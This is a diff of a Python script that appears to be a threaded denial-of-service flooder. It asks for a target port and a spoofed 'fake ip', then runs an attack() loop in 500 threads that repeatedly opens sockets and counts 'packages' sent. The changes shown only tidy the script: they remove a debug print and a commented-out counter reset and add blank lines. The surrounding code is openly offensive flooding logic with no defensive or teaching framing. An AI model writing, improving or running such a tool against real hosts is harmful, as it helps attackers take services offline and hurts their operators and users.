@@ -2,7 +2,7 @@ import threading
 import banner
 import socket
 from colorama import Fore
-print("THIS IS PAGE")
+
 R = Fore.RED
 Y = Fore.YELLOW
 B = Fore.BLUE
@@ -16,6 +16,7 @@ port = int(input(f"{G}Enter port: "))
 fake_ip = input(f"{G}Enter a fake ip [{Y}example: {B}40.51.10.2]{G}: {RT} ")
 counter = 0
 
+
 def attack():
 
     while True:
@@ -28,11 +29,6 @@ def attack():
         print(f'\t{G}[{B}*{G}]\t {G} Send {R} {counter} {G}package {RT}')
         counter += 1
         s.close()
-
-	# if counter == 10000:
-            # print(f'\t{G}[{B}*{G}]\t {G} Send {R} {counter} {G}package {RT}')
-            # counter == 0
-            # continue
 
 
 for i in range(500):
